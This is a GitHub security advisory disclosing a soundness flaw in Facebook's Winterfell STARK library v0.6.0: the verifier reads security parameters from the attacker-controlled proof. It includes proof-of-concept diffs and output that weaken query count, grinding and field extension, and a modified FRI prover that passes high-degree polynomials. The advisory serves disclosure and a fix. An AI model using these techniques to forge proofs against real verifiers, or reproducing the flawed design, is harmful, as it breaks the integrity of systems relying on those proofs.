---
title: 'Facebook: Critical bugs in Facebook/Polygon Winterfell library'
severity: High
ghsa_id: GHSA-8fhq-pf83-pv93
cve_id: null
weaknesses: []
products:
- ecosystem: Facebook
  package_name: Winterfell
  affected_versions: v0.6.0
  patched_versions: ''
cvss: null
credits:
- github_user_id: cryptosubtlety
  name: Quan Thoi Minh Nguyen
  avatar: https://avatars.githubusercontent.com/u/1834775?s=40&v=4
---

### Summary
In any succinct proof system, the prover’s goal is to convince the verifier that a certain statement is true. In practical systems, the verifier and the prover must agree on a set of security parameters that define how secure the system is. For instance, if the security parameter is set to 128-bit, we expect an attacker to spend 2128 resources to break it; in other extremes if the security parameter is 0-bit, the system has no security at all. The question is where security parameters come from? In simple systems, the security parameters are hard-coded constants and in complicated ones, the security parameters are defined in config files or keyset style like Google Tink. From the security perspective, it’s crucial that the prover can not affect the verifier's security parameters. The Winterfell system allows the malicious prover to set security parameters and makes it completely insecure.
[Verifier's bug](https://github.com/facebook/winterfell/blob/cd76df242fcec8bab45efcdabf366fb0d8c76fbd/verifier/src/lib.rs#L96):
let air = AIR::new(proof.get_trace_info(), pub_inputs, proof.options().clone());
As we can see, the verifier extracts the proof options from the proof which is fully controlled by the prover. Winterfell’s [ProofOptions](https://github.com/facebook/winterfell/blob/cd76df242fcec8bab45efcdabf366fb0d8c76fbd/air/src/options.rs#L37) defines several critical security parameters that the prover can manipulate. Note that proof soundness is bounded by    `num_queries * log2(blowup_factor) + grinding_factor`. This lead to several attack directions:
Set [num_queries](https://github.com/facebook/winterfell/blob/cd76df242fcec8bab45efcdabf366fb0d8c76fbd/air/src/options.rs#L61) to 1 (Winterfell checks for [0](https://github.com/facebook/winterfell/blob/cd76df242fcec8bab45efcdabf366fb0d8c76fbd/air/src/options.rs#L103) value) which reduces the security system to around 1 bit with blowup_factor equals to 2.
Set [grinding_factor ](https://github.com/facebook/winterfell/blob/cd76df242fcec8bab45efcdabf366fb0d8c76fbd/air/src/options.rs#L63)to 0 so effectively reduces the system security by grinding_factor bits where the “expected” grinding factor is typically 20 bits.
There is a 3rd way to exploit it. We can set [FieldExtension](https://github.com/facebook/winterfell/blob/cd76df242fcec8bab45efcdabf366fb0d8c76fbd/air/src/options.rs#L230) to 1 which significantly downgrades the system’s security. For instance, Plonky2 uses a 64-bit base field and uses field extension of degree 2 to make the system 128-bit security. By setting field extension degree back to 1, the attacker effectively reduces the system back to 64-bit security.
There may be other ways to exploit this issue.

### Severity
High - the verifier accepts a configuration parameter that can be controlled entirely by the adversary. This configuration parameter sets critical values such as the security parameter and field extension size.

### Proof of Concept
```
Preliminary PoCs to make sure that the verifier accepts malicious parameters. We also created PoC to bypass FRI -layer verification checks if the verifier doesn’t ask enough queries. We haven’t created a full PoC with a false statement yet.
Patch winterfell as described in [Git diff](https://docs.google.com/document/d/11mkjCfm9k7rbJXN8gUyZv_xJX3wLGMyIS0laWLe63SI/edit#heading=h.borvwyxolp2t) section and either run

1/ ./target/debug/winterfell fib -n 128
Output: 
“Proof security: 0 bits
Verifer's proof options at the end of execution: ProofOptions { num_queries: 1, blowup_factor: 2, grinding_factor: 16, field_extension: None, fri_folding_factor: 8, fri_max_remainder_size: 8 }”

2/ Run fib2_test_basic_proof_verification
Output:
“Proof: StarkProof { context: Context { trace_layout: TraceLayout { main_segment_width: 2, aux_segment_widths: [0], aux_segment_rands: [0], num_aux_segments: 0 }, trace_length: 8, trace_meta: [], field_modulus_bytes: [1, 0, 0, 0, 0, 211, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255], options: ProofOptions { num_queries: 1, blowup_factor: 2, grinding_factor: 0, field_extension: None, fri_folding_factor: 4, fri_max_remainder_size: 8 } }, commitments: Commitments([...]), trace_queries: [Queries { paths: [...], values: [...] }], constraint_queries: Queries { paths: [...], values: [...] }, ood_frame: OodFrame { trace_states: [...], evaluations: [...] }, fri_proof: FriProof { layers: [], remainder: [...], num_partitions: 0 }, pow_nonce: 1 }
 
Verifer's proof options at the end of execution: ProofOptions { num_queries: 1, blowup_factor: 2, grinding_factor: 0, field_extension: None, fri_folding_factor: 4, fri_max_remainder_size: 8 }
test fibonacci::fib2::tests::fib2_test_basic_proof_verification ... ok”


Git diff
diff --git a/examples/src/fibonacci/fib2/mod.rs b/examples/src/fibonacci/fib2/mod.rs
index 7deec1f..7f4f6df 100644
--- a/examples/src/fibonacci/fib2/mod.rs
+++ b/examples/src/fibonacci/fib2/mod.rs
@@ -35,7 +35,7 @@ pub fn get_example(
     options: &ExampleOptions,
     sequence_length: usize,
 ) -> Result<Box<dyn Example>, String> {
-    let (options, hash_fn) = options.to_proof_options(28, 8);
+    let (options, hash_fn) = options.to_proof_options(1, 2);
 
     match hash_fn {
         HashFunction::Blake3_192 => Ok(Box::new(FibExample::<Blake3_192>::new(
diff --git a/examples/src/fibonacci/utils.rs b/examples/src/fibonacci/utils.rs
index 3ac7edc..6aecdab 100644
--- a/examples/src/fibonacci/utils.rs
+++ b/examples/src/fibonacci/utils.rs
@@ -38,5 +38,5 @@ pub fn build_proof_options(use_extension_field: bool) -> winterfell::ProofOption
     } else {
         FieldExtension::None
     };
-    ProofOptions::new(28, 8, 0, extension, 4, 256)
+    ProofOptions::new(1, 2, 0, extension, 4, 256)
 }
diff --git a/examples/src/tests.rs b/examples/src/tests.rs
index 704dbed..2f07a20 100644
--- a/examples/src/tests.rs
+++ b/examples/src/tests.rs
@@ -7,6 +7,7 @@ use crate::Example;
 
 pub fn test_basic_proof_verification(e: Box<dyn Example>) {
     let proof = e.prove();
+    println!("Proof: {:?}", proof);
     assert!(e.verify(proof).is_ok());
 }
 
diff --git a/verifier/src/lib.rs b/verifier/src/lib.rs
index 480c338..077df9e 100644
--- a/verifier/src/lib.rs
+++ b/verifier/src/lib.rs
@@ -292,7 +292,9 @@ where
     // 7 ----- Verify low-degree proof -------------------------------------------------------------
     // make sure that evaluations of the DEEP composition polynomial we computed in the previous
     // step are in fact evaluations of a polynomial of degree equal to trace polynomial degree
-    fri_verifier
+    let result = fri_verifier
         .verify(&mut channel, &deep_evaluations, &query_positions)
-        .map_err(VerifierError::FriVerificationFailed)
+        .map_err(VerifierError::FriVerificationFailed);
+    println!("Verifer's proof options at the end of execution: {:?}", air.options());
+    result
 }
```
Create PoC at the FRI layer as described by Alessandro Chiesa at [FRI protocol](https://www.youtube.com/watch?v=BJJNiAmhdNA&list=PLGkwtcB-DfpzST-medFVvrKhinZisfluC&index=20&t=3296s) where the polynomial has high degree but if the verifier doesn’t ask enough queries then it can bypass the verifier’s checks.

```
Run “fn fri_folding_2()” test.
Output: “
Real degree: 32766, max allowed degree: 4095
i: 0, positions: [21623, 21940, 12457, 12886], result: Ok(())
Real degree: 32766, max allowed degree: 4095
i: 1, positions: [30582, 30609, 18320, 31125], result: Err(InvalidLayerFolding(1))
Real degree: 32766, max allowed degree: 4095
i: 2, positions: [26893, 26048, 11286, 6680], result: Ok(())
…
Passed : 8, failed: 8”


diff --git a/fri/src/prover/mod.rs b/fri/src/prover/mod.rs
index b62c71e..78f1a83 100644
--- a/fri/src/prover/mod.rs
+++ b/fri/src/prover/mod.rs
@@ -215,6 +215,13 @@ where
         // projection to reduce the degree of evaluations by N
         let alpha = channel.draw_fri_alpha();
         *evaluations = apply_drp(&transposed_evaluations, self.domain_offset(), alpha);
+        // i/ The prover commits to the 0 layer the correct but *high* (i.e. higher than the max allowed degree) degree polynomial.
+        // ii/ However from layer 1 onward, the prover acts as if the polynomial is zero polynomial.
+        //     If the verifier queries' don't land in the noisy positions (with probability 1 - delta)
+        //     then this will pass the verification.
+        for e in evaluations.iter_mut() {
+            *e = E::ZERO;
+        }
         self.layers.push(FriLayer {
             tree: evaluation_tree,
             evaluations: flatten_vector_elements(transposed_evaluations),
diff --git a/fri/src/prover/tests.rs b/fri/src/prover/tests.rs
index 2c4597f..88c446d 100644
--- a/fri/src/prover/tests.rs
+++ b/fri/src/prover/tests.rs
@@ -52,7 +52,7 @@ pub fn build_prover_channel(
     trace_length: usize,
     options: &FriOptions,
 ) -> DefaultProverChannel<BaseElement, BaseElement, Blake3> {
-    DefaultProverChannel::new(trace_length * options.blowup_factor(), 32)
+    DefaultProverChannel::new(trace_length * options.blowup_factor(), 4)
 }
 pub fn build_evaluations(trace_length: usize, lde_blowup: usize) -> Vec<BaseElement> {
@@ -113,38 +113,44 @@ fn fri_prove_verify(
     let max_remainder_size = 1 << max_remainder_size_e;
 
     let options = FriOptions::new(lde_blowup, folding_factor, max_remainder_size);
-    let mut channel = build_prover_channel(trace_length, &options);
-    let evaluations = build_evaluations(trace_length, lde_blowup);
-
+    let domain_size = trace_length * lde_blowup;
+    let mut passed = 0;
     // instantiate the prover and generate the proof
-    let mut prover = FriProver::new(options.clone());
-    prover.build_layers(&mut channel, evaluations.clone());
-    let positions = channel.draw_query_positions();
-    let proof = prover.build_proof(&positions);
-
-    // make sure the proof can be verified
-    let commitments = channel.layer_commitments().to_vec();
-    let max_degree = trace_length - 1;
-    let result = verify_proof(
-        proof.clone(),
-        commitments.clone(),
-        &evaluations,
-        max_degree,
-        trace_length * lde_blowup,
-        &positions,
-        &options,
-    );
-    assert!(result.is_ok(), "{:}", result.err().unwrap());
-
-    // make sure proof fails for invalid degree
-    let result = verify_proof(
-        proof,
-        commitments,
-        &evaluations,
-        max_degree - 8,
-        trace_length * lde_blowup,
-        &positions,
-        &options,
-    );
-    assert!(result.is_err());

+    for i in 0..16 {
+        let mut evaluations = vec![BaseElement::ZERO; domain_size];
+        // The subset L of domain where the polynomial is different from zero.
+        // Notice that if w is in L then -w is in L.
+        for j in 0..domain_size/8 {
+            evaluations[j] = BaseElement::new(i + 1);
+            evaluations[j + domain_size/2] = BaseElement::new(i + 1);
+        }
+        let mut ec = evaluations.clone();
+        let inv_twiddles = fft::get_inv_twiddles::<BaseElement>(domain_size);
+        fft::interpolate_poly(&mut ec, &inv_twiddles);
+
+        let mut channel = build_prover_channel(trace_length, &options);
+        let mut prover = FriProver::new(options.clone());
+        prover.build_layers(&mut channel, evaluations.clone());
+        let positions = channel.draw_query_positions();
+        let proof = prover.build_proof(&positions);
+
+        // make sure the proof can be verified
+        let commitments = channel.layer_commitments().to_vec();
+        let max_degree = trace_length - 1;
+        println!("Real degree: {}, max allowed degree: {}", math::polynom::degree_of(&ec), max_degree);
+        let result = verify_proof(
+            proof.clone(),
+            commitments.clone(),
+            &evaluations,
+            max_degree,
+            trace_length * lde_blowup,
+            &positions,
+            &options,
+        );
+        if result.is_ok() {
+            passed += 1;
+        }
+        println!("i: {}, positions: {:?}, result: {:?}", i, positions, result);
+    }
+    println!("Passed : {}, failed: {}", passed, 16 - passed);
 }
(END)
```

### Further Analysis
The safest way to fix the root cause once and for all is to make an incompatible API changes in the code base where 
The proof shouldn’t contain proof options.
The verifier defines proof options by itself and doesn’t get it from the prover’s proof.
Note that we don’t lose flexibility by following this route because the system continues allowing proof options. The only change is we give the control of proof options to the right party-the verifier instead of giving the control to the adversary-the proof.

Alternatively, one may attempt to patch the bug by validating “good” proof options. This may temporarily fix the issue but I do believe that it’s not a bulletproof design security-wise.


### Timeline
**Date reported**: 2/13/2023
**Date fixed**: 
**Date disclosed**: 4/12/2023